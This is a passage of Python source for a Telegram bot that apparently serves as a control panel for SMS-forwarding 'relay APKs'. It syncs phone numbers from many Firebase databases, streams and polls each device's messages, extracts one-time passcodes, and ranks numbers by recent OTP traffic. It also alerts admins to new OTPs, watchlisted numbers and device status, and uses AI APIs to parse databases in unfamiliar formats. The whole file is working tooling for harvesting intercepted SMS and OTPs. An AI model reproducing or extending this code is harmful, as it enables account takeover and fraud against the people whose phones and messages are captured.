            if rows: return rows, "D", None
        rows = _sim_entries_from(full, base, "C")
        if rows: return rows, "C", None
        rows, stype = _pat_E(full, base)
        if rows: return rows, stype, None

    # AI fallback
    g_key = _get_groq_key()
    a_key = _get_anthropic_key()
    if g_key or a_key:
        log.info("[AI] All patterns failed — calling AI for %s", base)
        entries, pattern, err = await _groq_learn_structure(base, api_key)
        if entries:
            return entries, f"AI-{pattern.get('pattern_id','?')}", None
        if err:
            for aid in ADMIN_IDS:
                try: await bot.send_message(aid,
                    f"❌ <b>Parse Failed</b>\n<code>{base.split('//')[-1].split('.')[0]}</code>\n{err}")
                except Exception: pass

    return [], "?", "No phone numbers found in any known structure"


# ══════════════════════════════════════════════════════════════
# SYNC
# ══════════════════════════════════════════════════════════════

async def sync_one(url, label=None, api_key=None):
    base = url.replace(".json","").rstrip("/")
    if not api_key: api_key = _get_fb_apikey(base)
    async with aiohttp.ClientSession() as sess:
        entries, stype, err = await detect_firebase(sess, url, api_key=api_key)
        if err:
            # Record parse failure
            with db.cx() as c:
                c.execute(
                    "UPDATE firebase_sources SET fail_count=fail_count+1,"
                    "parse_failures=parse_failures+1,"
                    "last_health_check=? WHERE url=?",
                    (_now_ist().strftime("%d-%m-%Y %H:%M"), base))
            _check_quarantine(base, "parse_failures")
            return 0, err, "?"

        n = 0; ghost_n = 0
        with db.cx() as c:
            for e in entries:
                is_ghost = 1 if str(e["number"]).startswith("DEV-") else 0
                if is_ghost: ghost_n += 1
                c.execute("""INSERT INTO numbers
                    (number,device_id,device_name,sim_slot,carrier,status,
                     fb_source,sms_path,status_path,struct_type,is_ghost)
                    VALUES(?,?,?,?,?,?,?,?,?,?,?)
                    ON CONFLICT(number) DO UPDATE SET
                        device_id=excluded.device_id,device_name=excluded.device_name,
                        sim_slot=excluded.sim_slot,carrier=excluded.carrier,
                        status=excluded.status,fb_source=excluded.fb_source,
                        sms_path=excluded.sms_path,status_path=excluded.status_path,
                        struct_type=excluded.struct_type,
                        is_ghost=CASE WHEN excluded.is_ghost=0 THEN 0 ELSE numbers.is_ghost END""",
                    (e["number"], e["device_id"], e["device_name"], e["sim_slot"],
                     e["carrier"], e["status"], base,
                     e["sms_path"], e["status_path"], e["struct_type"], is_ghost))
                n += 1

            # Update pattern stats
            c.execute("""INSERT INTO pattern_stats(pattern,success,failure,last_used)
                VALUES(?,1,0,?) ON CONFLICT(pattern) DO UPDATE SET
                success=success+1,last_used=excluded.last_used""",
                (stype, _now_ist().strftime("%d-%m-%Y %H:%M")))

        now = _now_ist().strftime("%d-%m-%Y %H:%M")
        lbl = label or base.split("//")[-1].split(".")[0]
        with db.cx() as c:
            c.execute("""INSERT INTO firebase_sources(url,label,added_at,last_synced,
                num_count,struct_type,api_key,fail_count,health_level)
                VALUES(?,?,?,?,?,?,?,0,'Excellent')
                ON CONFLICT(url) DO UPDATE SET
                    label=CASE WHEN label IS NULL OR label='' THEN excluded.label ELSE label END,
                    last_synced=excluded.last_synced,
                    num_count=excluded.num_count,
                    struct_type=excluded.struct_type,
                    api_key=COALESCE(excluded.api_key,api_key),
                    fail_count=0, health_level='Excellent'""",
                (base, lbl, now, now, n, stype, api_key))

            # Auto-populate ghost queue
            ghosts = c.execute(
                "SELECT id FROM numbers WHERE (is_ghost=1 OR number LIKE 'DEV-%') AND fb_source=?",
                (base,)).fetchall()
            for g in ghosts:
                c.execute(
                    "INSERT OR IGNORE INTO ghost_queue(number_id,category,probe_count) VALUES(?,?,0)",
                    (g["id"], "Recoverable"))

        # FIX: Validate Active/Inactive using REAL SMS timestamps, not Firebase status field.
        # Firebase `status` field is unreliable — devices keep "Active" even after months of
        # inactivity. Tier rules:
        #   last SMS < 2h  → Active  (will be Tier 1 Hot automatically via last_sms_ts)
        #   last SMS 2-24h → Active  (will be Tier 2 Standby automatically — no recent SMS)
        #   last SMS > 24h → Inactive (Tier 3 Offline)
        #   no SMS at all  → Inactive
        now_ts     = int(datetime.now().timestamp())
        day_cutoff = now_ts - 86400  # 24-hour cutoff: older → Inactive (Tier 3)
        nums_inserted = db.cx().execute(
            "SELECT id, device_id, sms_path FROM numbers WHERE fb_source=?",
            (base,)).fetchall()
        for row in nums_inserted:
            sms_p = row["sms_path"] or ""
            if not sms_p:
                sms_p = f"{base}/sms_forward/{row['device_id']}"
            try:
                sms_node = await fb_get(sess, f"{sms_p}.json", api_key=api_key)
                latest_ts = _latest_sms_ts(sms_node) if isinstance(sms_node, dict) else None
            except Exception:
                latest_ts = None
            real_status = "Active" if (latest_ts is not None and latest_ts > day_cutoff) else "Inactive"
            with db.cx() as c:
                c.execute(
                    "UPDATE numbers SET status=?, last_sms_ts=COALESCE(?,last_sms_ts) WHERE id=?",
                    (real_status, latest_ts, row["id"]))

        log.info("Synced %s → %d numbers (ghost=%d struct=%s)", base, n, ghost_n, stype)
        return n, None, stype


def _check_quarantine(url: str, reason: str):
    """Quarantine a Firebase source if fail_count exceeds threshold."""
    threshold = int(db.get("quarantine_threshold") or 5)
    base      = url.replace(".json","").rstrip("/")
    src       = db.cx().execute(
        "SELECT fail_count,quarantined,label FROM firebase_sources WHERE url=?", (base,)).fetchone()
    if not src or src["quarantined"]: return
    if src["fail_count"] >= threshold:
        with db.cx() as c:
            c.execute("UPDATE firebase_sources SET quarantined=1,quarantine_reason=? WHERE url=?",
                      (reason, base))
        label = src["label"] or base.split("//")[-1].split(".")[0]
        for aid in ADMIN_IDS:
            try:
                asyncio.ensure_future(bot.send_message(aid,
                    f"⚠️ <b>Firebase Quarantined</b>\n\n"
                    f"📡 <b>Source:</b> {label}\n"
                    f"❌ <b>Reason:</b> {reason}\n"
                    f"🔢 <b>Failures:</b> {src['fail_count']}\n\n"
                    f"<i>Excluded from Hot Numbers, Radar & Active sync.</i>",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                        InlineKeyboardButton(text="🔄 Retry",  callback_data=f"fb_retry_{aid}"),
                        InlineKeyboardButton(text="🗑 Delete", callback_data=f"del_src_{aid}"),
                    ]])))
            except Exception: pass
        db.log_action(0, "Firebase Quarantined", f"{label}: {reason}")


# ══════════════════════════════════════════════════════════════
# AUTO RE-SYNC + BACKGROUND TASKS
# ══════════════════════════════════════════════════════════════

async def auto_resync():
    await asyncio.sleep(60)
    while True:
        srcs = db.cx().execute(
            "SELECT url FROM firebase_sources WHERE quarantined=0").fetchall()
        if srcs:
            log.info("[AutoSync] %d source(s)…", len(srcs))
            for s in srcs:
                try: await sync_one(s["url"])
                except Exception as e: log.warning("[AutoSync] %s: %s", s["url"], e)

        # Ghost auto-probe
        ghosts = db.cx().execute(
            "SELECT n.*, gq.id as gq_id FROM numbers n "
            "LEFT JOIN ghost_queue gq ON gq.number_id=n.id "
            "WHERE (n.is_ghost=1 OR n.number LIKE 'DEV-%') "
            "AND gq.category != 'Dead'").fetchall()
        if ghosts:
            resolved = []
            for g in ghosts:
                api_key = _get_fb_apikey(g["fb_source"])
                ph, ca  = await _auto_probe_number(g["device_id"], g["fb_source"], api_key)
                if ph and ph != g["number"]:
                    with db.cx() as cx:
                        cx.execute(
                            "UPDATE numbers SET number=?,carrier=?,is_ghost=0,last_seen_ts=? WHERE id=?",
                            (ph, ca or g["carrier"], int(datetime.now().timestamp()), g["id"]))
                        cx.execute(
                            "UPDATE ghost_queue SET category='Resolved' WHERE number_id=?",
                            (g["id"],))
                    resolved.append((g["device_id"], ph, ca))
                else:
                    # Increment probe count, categorize
                    probe_count = (g.get("probe_count") or 0) + 1
                    cat = "Dead" if probe_count > 20 else ("Learning" if probe_count > 5 else "Recoverable")
                    with db.cx() as cx:
                        cx.execute(
                            "UPDATE ghost_queue SET probe_count=?,category=?,last_probed=? WHERE number_id=?",
                            (probe_count, cat, _now_ist().strftime("%d-%m-%Y %H:%M"), g["id"]))

            if resolved:
                lines = "\n".join(
                    f"  ✅ <code>{did[:12]}</code> → <code>{ph}</code>" + (f" [{ca}]" if ca else "")
                    for did, ph, ca in resolved)
                for aid in ADMIN_IDS:
                    try:
                        await bot.send_message(aid,
                            f"👻 <b>Ghost Resolved!</b>\n\n"
                            f"Found real numbers for <b>{len(resolved)}</b> ghost device(s):\n\n"
                            f"{lines}\n\n<i>Moved to Active section.</i>")
                    except Exception: pass

        await asyncio.sleep(RESYNC_INTERVAL)


async def auto_tier_demotion():
    """Every hour: enforce 3-tier rules strictly.
    - Active + last_sms_ts > 24h → Inactive  (Tier 3)
    - Inactive + last_sms_ts < 24h → Active   (re-promote if SMS arrived)
    Tier 1 vs Tier 2 split is handled at query time via last_sms_ts vs 2h cutoff,
    so no DB write is needed for that transition — it's automatic.
    """
    await asyncio.sleep(120)  # first run 2 min after startup
    while True:
        try:
            now_ts     = int(datetime.now().timestamp())
            day_cutoff = now_ts - 86400
            two_h_cut  = now_ts - 7200
            with db.cx() as c:
                # Demote Tier 1/2 → Tier 3: Active with no SMS in 24h
                # FIX ROOT-CAUSE 2: removed "last_sms_ts IS NULL" from the condition.
                # NULL means we've never seen an SMS yet — not that the device is dead.
                # Only demote when we have a real timestamp that is provably old.
                c.execute(
                    "UPDATE numbers SET status='Inactive' "
                    "WHERE status='Active' AND is_ghost=0 "
                    "AND last_sms_ts IS NOT NULL AND last_sms_ts < ?",
                    (day_cutoff,))
                demoted = c.execute("SELECT changes()").fetchone()[0]
                # Re-promote Tier 3 → Tier 1/2: Inactive but SMS arrived < 24h
                # (this catches numbers that received SMS via SSE/poll since last sync)
                c.execute(
                    "UPDATE numbers SET status='Active' "
                    "WHERE status='Inactive' AND is_ghost=0 "
                    "AND last_sms_ts IS NOT NULL AND last_sms_ts >= ?",
                    (day_cutoff,))
                promoted = c.execute("SELECT changes()").fetchone()[0]
            if demoted or promoted:
                log.info("[TierDemotion] demoted=%d promoted=%d", demoted, promoted)
        except Exception as e:
            log.warning("[TierDemotion] %s", e)
        await asyncio.sleep(3600)


async def auto_quarantine_recovery():
    """Every 30 min: retry quarantined Firebase sources."""
    await asyncio.sleep(1800)
    while True:
        quarantined = db.cx().execute(
            "SELECT * FROM firebase_sources WHERE quarantined=1").fetchall()
        for src in quarantined:
            try:
                async with aiohttp.ClientSession() as sess:
                    code, _ = await fb_ping(sess, src["url"], api_key=src["api_key"])
                if code == 200:
                    n, err, stype = await sync_one(src["url"])
                    if not err:
                        with db.cx() as c:
                            c.execute(
                                "UPDATE firebase_sources SET quarantined=0,"
                                "quarantine_reason=NULL,fail_count=0,"
                                "health_level='Excellent' WHERE url=?",
                                (src["url"],))
                        label = src["label"] or src["url"].split("//")[-1].split(".")[0]
                        for aid in ADMIN_IDS:
                            try:
                                await bot.send_message(aid,
                                    f"✅ <b>Firebase Recovered!</b>\n\n"
                                    f"📡 <b>Source:</b> {label}\n"
                                    f"📱 <b>Numbers:</b> {n} synced\n"
                                    f"🏗 <b>Structure:</b> {stype}\n\n"
                                    f"<i>Status restored to Excellent.</i>")
                            except Exception: pass
                        db.log_action(0, "Firebase Recovered", label)
            except Exception as e:
                log.warning("[QuarantineRecovery] %s: %s", src["url"], e)
        await asyncio.sleep(1800)


async def auto_status_monitor():
    """Every 5 min: detect Online→Offline and Offline→Online transitions."""
    await asyncio.sleep(300)
    while True:
        try:
            nums = db.cx().execute(
                "SELECT * FROM numbers WHERE is_ghost=0 AND number NOT LIKE 'DEV-%' "
                "AND fb_source IS NOT NULL").fetchall()
            for num in nums:
                try:
                    api_key = _get_fb_apikey(num["fb_source"])
                    online, _, _ = await dev_health(
                        num["device_id"], num["fb_source"], num["status_path"])

                    # FIX ROOT-CAUSE 1: online=None means Firebase has no status field
                    # (very common in Indian relay APKs). None is falsy → was wrongly
                    # treated as offline. Skip entirely when status is unknown.
                    if online is None:
                        continue

                    cur_status  = "Active" if online else "Inactive"
                    prev_status = num["status"]

                    # FIX ROOT-CAUSE 3: Never flip to Inactive if SMS arrived recently.
                    # The device is clearly alive — Firebase status field is just stale.
                    if cur_status == "Inactive":
                        row = db.cx().execute(
                            "SELECT last_sms_ts FROM numbers WHERE id=?",
                            (num["id"],)).fetchone()
                        if row and row["last_sms_ts"] and \
                           (int(datetime.now().timestamp()) - row["last_sms_ts"]) < 7200:
                            continue  # SMS in last 2h → device is alive, skip status flip

                    if cur_status != prev_status:
                        with db.cx() as c:
                            if cur_status == "Inactive":
                                c.execute(
                                    "UPDATE numbers SET status='Inactive',offline_since=? WHERE id=?",
                                    (int(datetime.now().timestamp()), num["id"]))
                            else:
                                offline_since = num.get("offline_since")
                                c.execute(
                                    "UPDATE numbers SET status='Active',offline_since=NULL WHERE id=?",
                                    (num["id"],))

                        nd = _disp(num["number"])
                        if cur_status == "Inactive":
                            alert = (f"🔴 <b>Device Offline</b>\n\n"
                                     f"📞 <code>{nd}</code>\n"
                                     f"📱 {num['device_name'] or 'Unknown'}\n"
                                     f"📶 {num['carrier'] or 'N/A'}")
                        else:
                            dur = ""
                            if num.get("offline_since"):
                                secs = int(datetime.now().timestamp()) - num["offline_since"]
                                h, m = divmod(secs // 60, 60)
                                dur  = f"\n⏱ Offline for: <b>{h}h {m}m</b>"
                            alert = (f"🟢 <b>Device Online</b>\n\n"
                                     f"📞 <code>{nd}</code>\n"
                                     f"📱 {num['device_name'] or 'Unknown'}\n"
                                     f"📶 {num['carrier'] or 'N/A'}{dur}")

                        if not _alerts_paused:
                            for aid in ADMIN_IDS:
                                try:
                                    await bot.send_message(aid, alert, reply_markup=InlineKeyboardMarkup(
                                        inline_keyboard=[[InlineKeyboardButton(
                                            text="🔕 Stop Alerts", callback_data="stop_alerts")]]))
                                except Exception: pass

                except Exception:
                    pass
        except Exception as e:
            log.warning("[StatusMonitor] %s", e)
        await asyncio.sleep(300)


async def auto_hot_score():
    """Every 15 min: recalculate hot scores based on OTP SMS activity only."""
    await asyncio.sleep(900)
    while True:
        try:
            with db.cx() as c:
                # Reset scores
                c.execute("UPDATE numbers SET hot_score=0")
                # Score by OTP SMS count only (last 6 h) — non-OTP SMS don't count
                cutoff = (_now_ist() - timedelta(hours=6)).strftime("%d-%m-%Y %H:%M:%S")
                rows   = c.execute(
                    "SELECT number, COUNT(*) as cnt FROM sms_log "
                    "WHERE received_at > ? AND otp IS NOT NULL AND sms_category='OTP' "
                    "GROUP BY number",
                    (cutoff,)).fetchall()
                for r in rows:
                    # Also count any SMS (for total context) but weight OTP heavily
                    all_cnt = c.execute(
                        "SELECT COUNT(*) as c FROM sms_log "
                        "WHERE number=? AND received_at>?",
                        (r["number"], cutoff)).fetchone()["c"]
                    score = r["cnt"] * 10 + all_cnt  # OTP = 10 pts each, other SMS = 1 pt
                    # FIX: only update hot_score — last_sms_ts must only be written
                    # when an SMS is actually received, NOT during a score recalc.
                    # Writing it here would cause numbers with old OTPs to appear
                    # permanently in the 🟢 Hot tier.
                    c.execute("UPDATE numbers SET hot_score=? WHERE number=?",
                              (score, r["number"]))
                # Auto-detect N/A carrier numbers and flag them for testing
                na_nums = c.execute(
                    "SELECT * FROM numbers WHERE (carrier IS NULL OR carrier='' OR carrier='N/A') "
                    "AND is_ghost=0 AND status='Active'").fetchall()
                for n in na_nums:
                    # Mark as needs_network_check
                    c.execute("UPDATE numbers SET hot_score=CASE WHEN hot_score>0 THEN hot_score ELSE -1 END "
                              "WHERE id=?", (n["id"],))
        except Exception as e:
            log.warning("[HotScore] %s", e)
        await asyncio.sleep(900)


# ══════════════════════════════════════════════════════════════
# FETCH SMS
# ══════════════════════════════════════════════════════════════

async def _try_fetch_from_path(sess, path, device_id, fb_source, api_key=None):
    node = await fb_get(sess, f"{path}.json", api_key=api_key)
    if not isinstance(node, dict) or not node: return None
    entry, eid = _latest(node)
    if entry is None: return None
    ck = f"{device_id}:{fb_source}"
    if last_sms_seen.get(ck) == eid: return None
    last_sms_seen[ck] = eid
    msg, sender, ts   = _norm_sms(entry)
    if not msg: return None
    otp = re.search(r'\b(\d{4,8})\b', msg)
    return {"otp": otp.group(1) if otp else None,
            "sender": sender, "message": msg, "time": ts}


async def fetch_sms(number, device_id, fb_source, sms_path=None):
    try:
        async with aiohttp.ClientSession() as sess:
            api_key = _get_fb_apikey(fb_source)
            paths   = []
            if sms_path: paths.append((sms_path, fb_source, api_key))
            if fb_source:
                b = fb_source.replace(".json","").rstrip("/")
                if sms_path:
                    # FIX: sms_path already known — skip the slow shallow root probe.
                    # Just add sms_forward as a quick parallel fallback (no extra round-trip).
                    fwd = f"{b}/sms_forward/{device_id}"
                    if (fwd, fb_source, api_key) not in paths:
                        paths.append((fwd, fb_source, api_key))
                else:
                    # No cached path — do the full probe to discover the correct path.
                    sh = await fb_get(sess, f"{b}/.json?shallow=true", api_key=api_key)
                    rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                    extras = [f"{b}/user_sms/{device_id}", f"{b}/sms_forward/{device_id}",
                              f"{b}/sms/{device_id}", f"{b}/messages/{device_id}",
                              f"{b}/All_Users/sms/{device_id}", f"{b}/{device_id}/sms"]
                    if rk: extras = [f"{b}/{rk}/All_User/Sms/{device_id}"] + extras
                    for p in extras:
                        if (p, fb_source, api_key) not in paths:
                            paths.append((p, fb_source, api_key))
            for path, src, key in paths:
                result = await _try_fetch_from_path(sess, path, device_id, src, key)
                if result:
                    result["number"] = number
                    return result
    except Exception as e:
        log.warning("fetch_sms error: %s", e)
    return None


async def fetch_last_n_sms(number, device_id, fb_source, sms_path=None, n=5):
    results = []
    try:
        async with aiohttp.ClientSession() as sess:
            api_key = _get_fb_apikey(fb_source)
            paths   = []
            if sms_path: paths.append(sms_path)
            if fb_source:
                b = fb_source.replace(".json","").rstrip("/")
                if sms_path:
                    # FIX: sms_path known — skip the slow shallow root probe, add fallback only.
                    fwd = f"{b}/sms_forward/{device_id}"
                    if fwd not in paths: paths.append(fwd)
                else:
                    sh = await fb_get(sess, f"{b}/.json?shallow=true", api_key=api_key)
                    rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                    extras = [f"{b}/user_sms/{device_id}", f"{b}/sms_forward/{device_id}",
                              f"{b}/sms/{device_id}", f"{b}/messages/{device_id}",
                              f"{b}/All_Users/sms/{device_id}", f"{b}/{device_id}/sms"]
                    if rk: extras = [f"{b}/{rk}/All_User/Sms/{device_id}"] + extras
                    for p in extras:
                        if p not in paths: paths.append(p)
            for path in paths:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if not isinstance(node, dict) or not node: continue
                for entry, _ in _top_n(node, n):
                    msg, sender, ts = _norm_sms(entry)
                    if msg:
                        otp = re.search(r'\b(\d{4,8})\b', msg)
                        results.append({"sender": sender, "message": msg,
                                        "time": ts, "otp": otp.group(1) if otp else None})
                if results: break
    except Exception as e:
        log.warning("fetch_last_n_sms error: %s", e)
    return results


# ══════════════════════════════════════════════════════════════
# SSE STREAMING
# ══════════════════════════════════════════════════════════════

async def _discover_sms_path(device_id: str, fb_source: str, api_key=None) -> str:
    """Try common SMS path patterns and return the first one that has data."""
    if not fb_source or not device_id: return ""
    base = fb_source.replace(".json","").rstrip("/")
    candidates = [
        f"{base}/user_sms/{device_id}",
        f"{base}/sms_forward/{device_id}",
        f"{base}/sms/{device_id}",
        f"{base}/messages/{device_id}",
        f"{base}/All_Users/sms/{device_id}",
        f"{base}/{device_id}/sms",
    ]
    try:
        async with aiohttp.ClientSession() as sess:
            # Also try with the first root key (pattern A)
            sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
            if rk:
                candidates.insert(0, f"{base}/{rk}/All_User/Sms/{device_id}")
            for path in candidates:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(node, dict) and node:
                    log.info("[PathDiscover] Found sms_path for %s → %s", device_id, path)
                    # Save discovered path to DB so next time it's instant
                    try:
                        with db.cx() as c:
                            c.execute("UPDATE numbers SET sms_path=? WHERE device_id=? AND fb_source=?",
                                      (path, device_id, base))
                    except Exception: pass
                    return path
    except Exception as e:
        log.warning("[PathDiscover] error for %s: %s", device_id, e)
    return ""


async def _sse_listener(sms_path: str, device_id: str, fb_source: str,
                        api_key, queue: asyncio.Queue, uid: int):
    # FIX: if no sms_path, try to discover it instead of silently giving up
    if not sms_path:
        log.info("[SSE] No sms_path for %s — attempting auto-discover…", device_id)
        sms_path = await _discover_sms_path(device_id, fb_source, api_key)
        if not sms_path:
            log.warning("[SSE] Could not find sms_path for %s — SSE not started", device_id)
            return
    base_path = sms_path.replace(".json","").rstrip("/")
    # limitToLast=5: smallest seed that still catches burst OTPs; avoids large initial
    # payload that delays the first "put" acknowledgement on slow connections.
    url       = f"{base_path}.json?orderBy=%22%24key%22&limitToLast=5"
    if api_key: url += f"&auth={api_key}"
    headers   = {"Accept": "text/event-stream", "Cache-Control": "no-cache"}
    seen_keys: set = set()
    initial_loaded  = False

    while active_sessions.get(uid):
        try:
            async with _SSE_SEM:                 # global cap — prevents event-loop saturation
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(url, headers=headers,
                                        timeout=aiohttp.ClientTimeout(connect=8, total=None)) as resp:
                        if resp.status != 200:
                            await asyncio.sleep(2)
                            continue
                        event_type = None
                        async for raw_line in resp.content:
                            if not active_sessions.get(uid): return
                            line = raw_line.decode("utf-8", errors="ignore").rstrip("\r\n")
                            if line.startswith("event:"):
                                event_type = line[6:].strip()
                            elif line.startswith("data:") and event_type in ("put","patch"):
                                try:
                                    payload = json.loads(line[5:].strip())
                                    path    = payload.get("path","")
                                    data    = payload.get("data")
                                    if data is None:
                                        initial_loaded = True; event_type = None; continue
                                    if path == "/" and not initial_loaded:
                                        if isinstance(data, dict): seen_keys.update(data.keys())
                                        initial_loaded = True; event_type = None; continue
                                    # Update SSE watchdog timestamp
                                    sse_last_event[device_id] = asyncio.get_event_loop().time()
                                    if path == "/" and isinstance(data, dict):
                                        for k, v in data.items():
                                            if k not in seen_keys and isinstance(v, dict):
                                                seen_keys.add(k)
                                                await queue.put((v, k))
                                    elif path and path != "/" and isinstance(data, dict):
                                        key = path.lstrip("/").split("/")[0]
                                        if key and key not in seen_keys:
                                            seen_keys.add(key)
                                            await queue.put((data, key))
                                        elif key and isinstance(data, dict):
                                            for sk, sv in data.items():
                                                sub_key = f"{key}/{sk}"
                                                if sub_key not in seen_keys and isinstance(sv, dict):
                                                    seen_keys.add(sub_key)
                                                    await queue.put((sv, sub_key))
                                except Exception as e:
                                    log.warning("SSE parse: %s", e)
                                event_type = None
                            elif line == "":
                                event_type = None
        except asyncio.CancelledError:
            return
        except Exception as e:
            log.warning("SSE dropped (%s). Reconnect in 2s…", e)
            await asyncio.sleep(2)


# ══════════════════════════════════════════════════════════════
# DEVICE HEALTH
# ══════════════════════════════════════════════════════════════

async def dev_online(device_id, fb_source, status_path=None):
    """
    Returns True (online), False (offline), or None (status unknown — no field found).
    FIX: no longer defaults to True when status field is absent.
    """
    _STATUS_ONLINE_FIELDS  = ("status","Status","online","isOnline","Online","active","Active","isActive")
    _STATUS_OFFLINE_VALUES = {"offline","0","false","inactive","no","disconnected"}
    try:
        async with aiohttp.ClientSession() as sess:
            api_key = _get_fb_apikey(fb_source)
            paths   = []
            if status_path: paths.append(status_path)
            if fb_source:
                b  = fb_source.replace(".json","").rstrip("/")
                sh = await fb_get(sess, f"{b}/.json?shallow=true", api_key=api_key)
                rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                extras = [f"{b}/user_data/{device_id}", f"{b}/{device_id}"]
                if rk: extras = [f"{b}/{rk}/All_User/Info/{device_id}"] + extras
                paths += [p for p in extras if p not in paths]
            for path in paths:
                info = await fb_get(sess, f"{path}.json", api_key=api_key)
                if not isinstance(info, dict): continue
                for field in _STATUS_ONLINE_FIELDS:
                    sv = info.get(field)
                    if sv is not None:
                        return str(sv).strip().lower() not in _STATUS_OFFLINE_VALUES
                # Node exists but has no status field — check last_seen timestamp as proxy
                ts = _extract_last_seen_ts(info)
                if ts:
                    age_min = (datetime.now().timestamp() - ts) / 60
                    return age_min < 30  # seen within 30 min = probably online
                # Node found but truly no signal — return None (unknown) not True
                return None
    except Exception as e:
        log.warning("dev_online error: %s", e)
    return None  # FIX: was True — now None means "couldn't determine"


async def dev_health(device_id, fb_source, status_path=None):
    try:
        async with aiohttp.ClientSession() as sess:
            api_key = _get_fb_apikey(fb_source)
            paths   = []
            if status_path: paths.append(status_path)
            if fb_source and device_id:
                b = fb_source.replace(".json","").rstrip("/")
                # Only do the slow root-shallow probe when we don't already know the path
                if not status_path:
                    sh = await fb_get(sess, f"{b}/.json?shallow=true", api_key=api_key)
                    rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                    extras = [f"{b}/user_data/{device_id}", f"{b}/{device_id}"]
                    if rk: extras = [f"{b}/{rk}/All_User/Info/{device_id}"] + extras
                    for p in extras:
                        if p not in paths: paths.append(p)
                else:
                    # status_path is known — add only cheap fallbacks, skip root probe
                    for p in [f"{b}/user_data/{device_id}", f"{b}/{device_id}"]:
                        if p not in paths: paths.append(p)
            for path in paths[:4]:
                try:
                    info = await asyncio.wait_for(
                        fb_get(sess, path if path.endswith(".json") else f"{path}.json",
                               api_key=api_key), timeout=4.0)
                except asyncio.TimeoutError:
                    continue
                if not isinstance(info, dict): continue
                online  = _is_strictly_alive(info, max_hours=24.0)
                battery = None
                for bf in ("battery","Battery","batteryLevel","battery_level","batt"):
                    bv = info.get(bf)
                    if bv is not None:
                        try: battery = int(str(bv).replace("%",""))
                        except: pass
                        break
                # Extract live network/carrier info
                carrier = _extract_carrier_deep(info) or ""
                no_network = False
                if not carrier:
                    # Try to infer from status
                    for nf in ("networkType","network_type","networkInfo","simState",
                               "phoneType","dataState","callState"):
                        nv = info.get(nf)
                        if nv and isinstance(nv, (str, int)):
                            s = str(nv).lower()
                            if s in ("0","none","no_service","unknown","out_of_service",
                                     "emergency_only","disconnected"):
                                no_network = True
                            break
                warns   = []
                if not online: warns.append("device offline")
                if battery is not None and battery < 15:
                    warns.append(f"battery {battery}%")
                if no_network or (not carrier and not online):
                    warns.append("no network signal")
                warning = ("⚠️ <b>Warning:</b> " + " | ".join(warns).capitalize()
                           + " — SMS may be delayed.") if warns else None
                # Update carrier in DB if we found a real one
                if carrier:
                    try:
                        with db.cx() as c:
                            c.execute("UPDATE numbers SET carrier=? WHERE device_id=? AND (carrier IS NULL OR carrier='' OR carrier='N/A')",
                                      (carrier, device_id))
                    except Exception: pass
                return online, battery, warning
    except Exception as e:
        log.warning("dev_health error: %s", e)
    return True, None, None


async def _fetch_live_network(device_id: str, fb_source: str, api_key=None) -> str:
    """Fetch the live carrier/network for a device from Firebase. Returns empty string if not found."""
    if not fb_source or not device_id: return ""
    base = fb_source.replace(".json","").rstrip("/")
    try:
        async with aiohttp.ClientSession() as sess:
            sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
            paths = [f"{base}/user_data/{device_id}"]
            if rk: paths.insert(0, f"{base}/{rk}/All_User/Info/{device_id}")
            for path in paths:
                info = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(info, dict):
                    c = _extract_carrier_deep(info)
                    if c: return c
    except Exception: pass
    return ""


# ══════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════

def _disp(number):
    return f"Device {number[4:]}" if str(number).startswith("DEV-") else number


def _fmt_age(ts):
    """Return '2m ago', '3h ago', '1d ago' from epoch timestamp."""
    if not ts: return ""
    age_s = int(datetime.now().timestamp() - ts)
    if age_s < 0: age_s = 0
    age_m = age_s // 60
    if age_m < 1:   return "just now"
    if age_m < 60:  return f"{age_m}m ago"
    age_h = age_m // 60
    if age_h < 24:  return f"{age_h}h ago"
    return f"{age_h // 24}d ago"


def _health_icon(level):
    return {"Excellent":"🟢","Slow":"🟡","Warning":"🟠","Quarantined":"🔴"}.get(level,"⚪")


# ══════════════════════════════════════════════════════════════
# WATCHLIST CHECK
# ══════════════════════════════════════════════════════════════

async def _check_watchlist(number: str, sender: str, body: str, otp: str):
    row = db.cx().execute("SELECT * FROM watchlist WHERE number=?", (number,)).fetchone()
    if not row: return
    note_str = f"\n📝 Note: {row['note']}" if row.get("note") else ""
    alert    = (
        f"🚨 <b>WATCHLIST ALERT</b>\n\n"
        f"📞 <b>Number:</b> <code>{number}</code>{note_str}\n"
        f"📨 <b>From:</b> {sender}\n"
        f"{'🎯 OTP: <code>' + otp + '</code>' + chr(10) if otp else ''}"
        f"💬 <b>SMS:</b> <i>{body[:200]}</i>"
    )
    for aid in ADMIN_IDS:
        try: await bot.send_message(aid, alert)
        except Exception: pass


# ══════════════════════════════════════════════════════════════
# SMS FORMAT  (matching screenshot UI)
# ══════════════════════════════════════════════════════════════

def fmt_otp(d, number_detail=None):
    otp_val  = d.get("otp")
    number   = _disp(d.get("number",""))
    sender   = d.get("sender","?")
    time_str = d.get("time","")
    message  = d.get("message","")

    if otp_val:
        header = (f"🔖 <b>NEW OTP DETECTED</b> 🔖\n\n"
                  f"⚡ Fresh SMS just arrived!\n\n"
                  f"🔑 <b>NEW OTP → <code>{otp_val}</code></b>")
    else:
        header = (f"╔══════════════════════╗\n"
                  f"  📨 <b>SMS RECEIVED</b>\n"
                  f"╚══════════════════════╝\n\n"
                  f"⚡ Fresh SMS just arrived!")

    return (f"{header}\n"
            f"📱 <b>Device</b> · <code>{number}</code>\n"
            f"👤 <b>Sender</b> · {sender}\n\n"
            f"💬 <i>{message}</i>\n\n"
            f"✨ <i>Panel auto-refreshed above</i> ⬆")


def fmt_device_detail(num: dict, msgs: list, battery=None, online=True, total_sms=0, page=1, total_pages=1):
    """Format device detail matching screenshots — shows last 5 messages."""
    nd       = _disp(num["number"])

